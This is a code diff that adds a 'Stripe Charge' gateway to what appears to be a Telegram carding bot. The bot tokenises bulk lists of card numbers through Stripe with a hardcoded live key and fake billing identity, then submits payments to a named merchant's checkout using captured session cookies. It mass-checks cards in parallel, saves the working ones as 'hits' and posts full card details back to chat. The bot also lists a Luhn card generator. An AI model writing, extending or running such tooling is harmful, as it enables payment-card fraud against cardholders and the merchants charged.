@@ -55,6 +55,8 @@ HITS_FILE = "hits.json"
 PERMANENT_SITES_FILE = "permanent_sites.json"
 STRIPE_CARDS_FILE = "stripe_cards.json"
 STRIPE_HITS_FILE = "stripe_hits.json"
+SC_CARDS_FILE = "sc_cards.json"
+SC_HITS_FILE = "sc_hits.json"
 API_URL = "http://108.165.12.183:8081"
 MAX_CARDS_PER_BATCH = 999999
 
@@ -110,6 +112,7 @@ bin_cache = {}
 bin_cache_expiry = 3600
 hits_list = []
 stripe_hits_list = []
+sc_hits_list = []
 last_dead_proxies = []
 
 # Connection pooling - reusable HTTP session
@@ -139,6 +142,13 @@ STRIPE_SITES = [
     "https://prontoheat.com",
     "https://deveneys.ie"
 ]
+
+# Stripe Charge configuration
+SC_STRIPE_PK = "pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq"
+SC_COOKIES = "PHPSESSID=gk3hon1o2cevcq68frr473aqeh; X-Magento-Vary=1f62c8352e88c8b48b0f3c3c248d16c7dfafdeeb10e393475420db9df175a2fe; form_key=ay1R92X0rV5sYabB; mage-cache-storage={}; mage-cache-sessid=true; __stripe_mid=c0b7bddc-ec46-4761-8fab-f25617de6e5099c075; __stripe_sid=3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1"
+SC_CART_ID = "7KF6aKF4nYnlxCdFDS86kPsKyqbTQfuk"
+SC_MERCHANT_URL = "https://shop.manner.com"
+sc_mass_running = False
 
 # ============================================
 # COUNTRY FLAGS
@@ -660,6 +670,185 @@ def get_stripe_hits():
     if not stripe_hits_list:
         stripe_hits_list = load_stripe_hits()
     return stripe_hits_list
+
+# ============================================
+# STRIPE CHARGE GATEWAY
+# ============================================
+
+def sc_create_payment_method(card_number, exp_month, exp_year, cvc):
+    url = "https://api.stripe.com/v1/payment_methods"
+    payload = {
+        "type": "card",
+        "card[number]": card_number,
+        "card[cvc]": cvc,
+        "card[exp_year]": exp_year,
+        "card[exp_month]": exp_month,
+        "card[networks][preferred]": "visa",
+        "allow_redisplay": "unspecified",
+        "billing_details[address][state]": "CA",
+        "billing_details[address][postal_code]": "10080",
+        "billing_details[address][country]": "US",
+        "billing_details[address][city]": "chicago",
+        "billing_details[address][line1]": "camac street, camac street",
+        "billing_details[address][line2]": "",
+        "billing_details[email]": "crimsonkelcie@dollicons.com",
+        "billing_details[name]": "david wyen",
+        "billing_details[phone]": "2018379272",
+        "payment_user_agent": "stripe.js/34f0acd152; stripe-js-v3/34f0acd152; payment-element; deferred-intent; autopm",
+        "referrer": SC_MERCHANT_URL,
+        "time_on_page": str(random.randint(30000, 120000)),
+        "guid": str(uuid.uuid4()),
+        "muid": str(uuid.uuid4()),
+        "sid": str(uuid.uuid4()),
+        "key": SC_STRIPE_PK,
+        "_stripe_version": "2025-08-27.basil",
+    }
+    headers = {
+        "accept": "application/json",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://js.stripe.com",
+        "referer": "https://js.stripe.com/",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+    }
+    return http_session.post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
+
+def sc_send_payment(pm_id):
+    url = f"{SC_MERCHANT_URL}/man_int/rest/man_int/V1/guest-carts/{SC_CART_ID}/payment-information"
+    payload = {
+        "cartId": SC_CART_ID,
+        "billingAddress": {
+            "countryId": "US", "regionId": "12", "regionCode": "CA",
+            "region": "California",
+            "street": ["camac street, camac street", "", ""],
+            "company": "", "telephone": "2018379272",
+            "postcode": "10080", "city": "chicago",
+            "firstname": "david", "lastname": "wyen",
+            "vatId": "", "saveInAddressBook": 1
+        },
+        "paymentMethod": {
+            "method": "stripe_payments",
+            "additional_data": {"payment_method": pm_id},
+            "extension_attributes": {"agreement_ids": ["3", "4", "3", "4"]}
+        },
+        "email": "crimsonkelcie@dollicons.com"
+    }
+    headers = {
+        "accept": "*/*",
+        "content-type": "application/json",
+        "cookie": SC_COOKIES,
+        "origin": SC_MERCHANT_URL,
+        "referer": f"{SC_MERCHANT_URL}/man_int/checkout/",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+        "x-requested-with": "XMLHttpRequest"
+    }
+    return http_session.post(url, json=payload, headers=headers, timeout=REQUEST_TIMEOUT)
+
+def check_stripe_charge(cc, month, year, cvv):
+    start_time = time.time()
+    if len(year) == 2:
+        year = f"20{year}"
+    try:
+        stripe_resp = sc_create_payment_method(cc, month, year, cvv)
+        elapsed = round(time.time() - start_time, 2)
+        if stripe_resp.status_code != 200:
+            try:
+                err_data = stripe_resp.json().get("error", {})
+                err_msg = err_data.get("message", f"Stripe error {stripe_resp.status_code}")
+                err_code = err_data.get("code", "")
+                category, _ = classify_response(f"{err_code} {err_msg}")
+                return category, err_msg, err_msg, "N/A", "Stripe Charge", elapsed
+            except:
+                return "DECLINED", f"Stripe error {stripe_resp.status_code}", f"Stripe error {stripe_resp.status_code}", "N/A", "Stripe Charge", elapsed
+        
+        stripe_data = stripe_resp.json()
+        pm_id = stripe_data.get("id")
+        if not pm_id:
+            return "DECLINED", "No payment method ID", "No payment method ID", "N/A", "Stripe Charge", elapsed
+        
+        merchant_resp = sc_send_payment(pm_id)
+        elapsed = round(time.time() - start_time, 2)
+        
+        if merchant_resp.status_code == 200:
+            try:
+                resp_json = merchant_resp.json()
+                if resp_json.get("success") is False:
+                    msg = resp_json.get("message", "Merchant failed")
+                    category, _ = classify_response(msg)
+                    return category, msg, msg, "CHARGED", "Stripe Charge", elapsed
+            except:
+                pass
+            return "CHARGE", "Payment Successful", "Payment Successful", "CHARGED", "Stripe Charge", elapsed
+        else:
+            try:
+                err_msg = merchant_resp.json().get("message", f"Merchant error {merchant_resp.status_code}")
+            except:
+                err_msg = f"Merchant error {merchant_resp.status_code}"
+            category, _ = classify_response(err_msg)
+            return category, err_msg, err_msg, "N/A", "Stripe Charge", elapsed
+    except requests.exceptions.Timeout:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", "Timeout", "Request timed out", "N/A", "Stripe Charge", elapsed
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", str(e)[:80], str(e)[:80], "N/A", "Stripe Charge", elapsed
+
+# ============================================
+# STRIPE CHARGE CARD MANAGEMENT
+# ============================================
+
+def load_sc_cards():
+    return safe_json_load(SC_CARDS_FILE, [])
+
+def save_sc_cards(cards):
+    return safe_json_save(SC_CARDS_FILE, cards)
+
+def add_sc_card(cc, month, year, cvv):
+    cards = load_sc_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_sc_cards(cards)
+        return True
+    return False
+
+def clear_sc_cards():
+    save_sc_cards([])
+
+def get_all_sc_cards():
+    return load_sc_cards()
+
+def delete_sc_card(card_str):
+    cards = load_sc_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_sc_cards(cards)
+        return True
+    return False
+
+def load_sc_hits():
+    return safe_json_load(SC_HITS_FILE, [])
+
+def save_sc_hit(hit_data):
+    hits = load_sc_hits()
+    hits.append(hit_data)
+    safe_json_save(SC_HITS_FILE, hits)
+    global sc_hits_list
+    sc_hits_list.append(hit_data)
+    try:
+        sqlite_backup.save_hit_backup(hit_data, "stripe_charge")
+    except:
+        pass
+
+def get_sc_hits():
+    global sc_hits_list
+    if not sc_hits_list:
+        sc_hits_list = load_sc_hits()
+    return sc_hits_list
+
+def clear_sc_hits():
+    global sc_hits_list
+    sc_hits_list = []
+    safe_json_save(SC_HITS_FILE, [])
 
 # ============================================
 # SAFE JSON HANDLING
@@ -1540,6 +1729,48 @@ def format_stripe_response(card_data, category, status_msg, response_msg, price,
     message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
     return message
 
+def format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    if category == 'CHARGE':
+        title = f"\u26a1 {stylize_text('Card Charged')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
+    elif category == 'FUNDS':
+        title = f"\u26a1 {stylize_text('Insufficient Funds')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Charge')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
 # ============================================
 # BATCH SENDER
 # ============================================
@@ -1605,7 +1836,13 @@ def get_main_keyboard():
         InlineKeyboardButton("🔓 AU MASS", callback_data="stripe_mass"),
         InlineKeyboardButton("🔓 AU HITS", callback_data="stripe_hits")
     )
-    # ── Row 3: Infrastructure ──
+    # ── Row 3: Stripe Charge ──
+    keyboard.row(
+        InlineKeyboardButton("💳 SC CHK", callback_data="sc_check"),
+        InlineKeyboardButton("💳 SC MASS", callback_data="sc_mass"),
+        InlineKeyboardButton("💳 SC HITS", callback_data="sc_hits")
+    )
+    # ── Row 4: Infrastructure ──
     keyboard.row(
         InlineKeyboardButton("🌐 Sites", callback_data="sites"),
         InlineKeyboardButton("📡 Proxies", callback_data="proxies"),
@@ -1666,7 +1903,9 @@ def handle_document(message):
         file_name = message.document.file_name.lower()
         
         # Detectar gateway por nombre
-        if 'au' in file_name or 'stripe' in file_name:
+        if 'charge' in file_name or 'sc' in file_name:
+            gateway = "stripe_charge"
+        elif 'au' in file_name or 'stripe' in file_name:
             gateway = "stripe_auth"
         else:
             gateway = "shopify"
@@ -1688,7 +1927,12 @@ def handle_document(message):
                 parts = line.split('|')
                 if len(parts) >= 4:
                     cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-                    if gateway == "stripe_auth":
+                    if gateway == "stripe_charge":
+                        if add_sc_card(cc, month, year, cvv):
+                            cards_added += 1
+                        else:
+                            cards_dup += 1
+                    elif gateway == "stripe_auth":
                         if add_stripe_card(cc, month, year, cvv):
                             cards_added += 1
                         else:
@@ -1710,10 +1954,11 @@ def handle_document(message):
         
         gateway_names = {
             "shopify": "Shopify",
-            "stripe_auth": "Stripe Auth (FREE)"
+            "stripe_auth": "Stripe Auth (FREE)",
+            "stripe_charge": "Stripe Charge"
         }
         
-        gw_icon = "🔓" if gateway == "stripe_auth" else "🛒"
+        gw_icon = "💳" if gateway == "stripe_charge" else ("🔓" if gateway == "stripe_auth" else "🛒")
         response = f"""
 {LINE_DASH}
 📂 *FILE PROCESSED*
@@ -1728,7 +1973,9 @@ def handle_document(message):
             response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
         
         total_cards = 0
-        if gateway == "stripe_auth":
+        if gateway == "stripe_charge":
+            total_cards = len(get_all_sc_cards())
+        elif gateway == "stripe_auth":
             total_cards = len(get_all_stripe_cards())
         else:
             total_cards = len(get_all_cards())
@@ -1737,7 +1984,9 @@ def handle_document(message):
         
         markup = InlineKeyboardMarkup()
         if cards_added > 0:
-            if gateway == "stripe_auth":
+            if gateway == "stripe_charge":
+                markup.add(InlineKeyboardButton("💳 START SC MASS CHECK ▶️", callback_data="sc_mass"))
+            elif gateway == "stripe_auth":
                 markup.add(InlineKeyboardButton("🔓 START AU MASS CHECK ▶️", callback_data="stripe_mass"))
             else:
                 markup.add(InlineKeyboardButton("🛒 START MASS CHECK ▶️", callback_data="mass"))
@@ -1788,7 +2037,7 @@ def send_welcome(message):
     welcome_text = f"""
 ╔══════════════════════════════╗
    🤖 *{BOT_NAME} {BOT_VERSION}*
-   ⚡ Shopify + Stripe Auth
+   ⚡ Shopify + Stripe Auth + Stripe Charge
 ╚══════════════════════════════╝
 
 🛒 *━━ SHOPIFY GATEWAY ━━*
@@ -1799,13 +2048,18 @@ def send_welcome(message):
   /au `cc|mm|yy|cvv` ─ Single check
   /mau ─ Mass check (pipeline)
 
+💳 *━━ STRIPE CHARGE ━━*
+  /sc `cc|mm|yy|cvv` ─ Single check
+  /msc ─ Mass check (pipeline)
+
 🏦 *━━ UTILITIES ━━*
   /bin `424242` ─ BIN lookup
   /gen `424242` `10` ─ Generate cards (Luhn)
   /px ─ Deep proxy check (3 levels)
   /delproxy ─ Delete proxy
   /clearshopify ─ Clear Shopify cards
-  /clearau ─ Clear Stripe cards
+  /clearau ─ Clear Stripe Auth cards
+  /clearsc ─ Clear Stripe Charge cards
 
 ⚙️ *━━ SETTINGS ━━*
   /stats ─ Statistics
@@ -1897,6 +2151,342 @@ def stripe_command(message):
         bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
     except:
         bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# STRIPE CHARGE INDIVIDUAL COMMAND
+# ============================================
+
+@bot.message_handler(commands=['sc'])
+def sc_command(message):
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /sc cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13:
+        bot.reply_to(message, "❌ Invalid card number")
+        return
+    
+    processing_msg = bot.reply_to(message, "💳 *Checking with Stripe Charge Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(cc[:6])
+    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_charge(cc, month, year, cvv)
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': status_msg,
+            'response_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_sc_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# STRIPE CHARGE MASS CHECK
+# ============================================
+
+@bot.message_handler(commands=['msc'])
+def sc_mass_command(message):
+    global sc_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
+    
+    if mass_check_running or stripe_mass_running or sc_mass_running:
+        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
+        return
+    
+    cards = get_all_sc_cards()
+    if not cards:
+        bot.reply_to(message, "❌ No Stripe Charge cards saved. Send a .txt file (name with 'charge' or 'sc').")
+        return
+    
+    total = len(cards)
+    if total > 1000:
+        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs\n1000 CCs will be checked")
+        cards = cards[:1000]
+        total = 1000
+    
+    stop_mass_flag = False
+    mass_paused = False
+    sc_mass_running = True
+    
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
+    )
+    
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE CHARGE MASS CHECK*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *0*  │  ✅ Approved: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_sc_mass(chat_id, msg_id):
+        global sc_mass_running, stop_mass_flag
+        
+        stats = {
+            'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "N/A"
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(PARALLEL_WORKERS):
+            task_queue.put(None)
+        
+        def sc_worker(worker_id):
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_stripe_charge(cc, month, year, cvv)
+                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(PARALLEL_WORKERS):
+            w = threading.Thread(target=sc_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE CHARGE MASS CHECK*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_sc_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_response = response_msg if response_msg else status_msg
+                    last_price = price
+                    
+                    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+                        if category == 'CHARGE':
+                            stats['charge'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        elif category == 'FUNDS':
+                            stats['funds'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *STRIPE CHARGE ─ APPROVED* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {response_msg}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': response_msg,
+                            'response_msg': response_msg,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_sc_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_sc_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+        
+        try:
+            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 *Charge:* {stats['charge']}
+✅ *Approved:* {total_approved}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🏆 Ver Hits", callback_data="sc_hits"),
+            InlineKeyboardButton("📦 Nuevo Mass", callback_data="sc_mass")
+        )
+        
+        try:
+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+        
+        sc_mass_running = False
+    
+    t = threading.Thread(target=run_sc_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# STRIPE CHARGE HITS & CLEAR COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['schits'])
+def sc_hits_command(message):
+    hits = get_sc_hits()
+    if not hits:
+        bot.reply_to(message, "❌ No Stripe Charge hits yet")
+        return
+    response = f"💳 *{BOT_NAME} ─ STRIPE CHARGE HITS ({len(hits)})*\n{LINE_DASH}\n\n"
+    for i, hit in enumerate(hits[-20:], 1):
+        cc = hit.get('cc', '?')
+        month = hit.get('month', '?')
+        year = hit.get('year', '?')
+        cvv = hit.get('cvv', '?')
+        cat = hit.get('category', '?')
+        icon, _, dot = get_status_emoji(cat)
+        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
+        response += f"     └─ {icon} {cat}\n"
+    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['clearsc'])
+def clear_sc_command(message):
+    count = len(get_all_sc_cards())
+    clear_sc_cards()
+    response = f"""🗑️ *{BOT_NAME} ─ STRIPE CHARGE CARDS DELETED*
+{LINE_THIN}
+💳 *Cards deleted:* {count}
+📊 *Remaining:* 0
+
+💡 Send a new `.txt` file (name with 'charge' or 'sc') to load more cards"""
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
 
 # ============================================
 # PROXY DELETE COMMAND
@@ -2536,8 +3126,8 @@ def clear_shopify_command(message):
 
 @bot.message_handler(commands=['stop'])
 def stop_mass_check(message):
-    global mass_check_running, stripe_mass_running, stop_mass_flag
-    if mass_check_running or stripe_mass_running:
+    global mass_check_running, stripe_mass_running, sc_mass_running, stop_mass_flag
+    if mass_check_running or stripe_mass_running or sc_mass_running:
         stop_mass_flag = True
         bot.reply_to(message, f"🛑 *Stopping mass check...*\n{LINE_THIN}\nPlease wait while workers finish...", parse_mode='Markdown')
         try:
@@ -2560,8 +3150,10 @@ def show_stats(message):
     proxies = load_proxies()
     cards = get_all_cards()
     stripe_cards = get_all_stripe_cards()
+    sc_cards = get_all_sc_cards()
     hits = get_hits()
     stripe_hits = get_stripe_hits()
+    sc_hits_data = get_sc_hits()
     permanent = sqlite_backup.get_permanent_sites()
     
     stats_text = f"""📊 *{BOT_NAME} {BOT_VERSION}*
@@ -2577,6 +3169,10 @@ def show_stats(message):
 🔓 *━━ STRIPE AUTH (FREE) ━━*
    ├ 💳 Queued: *{len(stripe_cards)}*
    └ 🏆 Hits: *{len(stripe_hits)}*
+
+💳 *━━ STRIPE CHARGE ━━*
+   ├ 💳 Queued: *{len(sc_cards)}*
+   └ 🏆 Hits: *{len(sc_hits_data)}*
 
 ⚙️ *━━ SYSTEM ━━*
    ├ 📡 Proxies: *{len(proxies)}*
@@ -2828,7 +3424,7 @@ def mode_command(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    global current_max_workers, mass_check_running, stripe_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
+    global current_max_workers, mass_check_running, stripe_mass_running, sc_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
     
     if call.data == "check":
         bot.answer_callback_query(call.id)
@@ -2845,6 +3441,18 @@ def handle_callback(call):
     elif call.data == "stripe_mass":
         bot.answer_callback_query(call.id)
         bot.send_message(call.message.chat.id, "/mau")
+    
+    elif call.data == "sc_check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "💳 /sc cc|mm|yy|cvv")
+    
+    elif call.data == "sc_mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/msc")
+    
+    elif call.data == "sc_hits":
+        bot.answer_callback_query(call.id)
+        sc_hits_command(call.message)
     
     elif call.data == "stats":
         bot.answer_callback_query(call.id)
@@ -2956,7 +3564,7 @@ def handle_callback(call):
             pass
     
     elif call.data == "stop_mass":
-        if mass_check_running or stripe_mass_running:
+        if mass_check_running or stripe_mass_running or sc_mass_running:
             stop_mass_flag = True
             bot.answer_callback_query(call.id, "🛑 Stopping mass check...")
             try:
@@ -3108,6 +3716,12 @@ Please wait while workers finish...""",
   /clearau ─ Delete cards
   /auhits ─ View hits
 
+💳 *━━ STRIPE CHARGE ━━*
+  /sc `cc|mm|yy|cvv` ─ Single check
+  /msc ─ Mass check (pipeline)
+  /clearsc ─ Delete cards
+  /schits ─ View hits
+
 🏦 *━━ UTILITIES ━━*
   /bin `424242` ─ BIN lookup
   /gen `424242` `10` ─ Generate cards (Luhn)
@@ -3122,6 +3736,7 @@ Please wait while workers finish...""",
 📂 *━━ FILE UPLOAD ━━*
   Send `.txt` file → auto-load
   Name with "au"/"stripe" → Stripe Auth
+  Name with "charge"/"sc" → Stripe Charge
 
 🧹 *━━ AUTO-MAINTENANCE ━━*
   Dead sites auto-cleaned every 50 checks
@@ -3142,12 +3757,13 @@ Please wait while workers finish...""",
 # ============================================
 if __name__ == "__main__":
     print("\n" + "═" * 60)
-    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH")
+    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE")
     print(f"  🚀 PARALLEL PIPELINE MODE")
     print("═" * 60)
     print(f"  🌐 Public mode: ALL USERS")
     print(f"  🛒 Shopify cards: {len(get_all_cards())}")
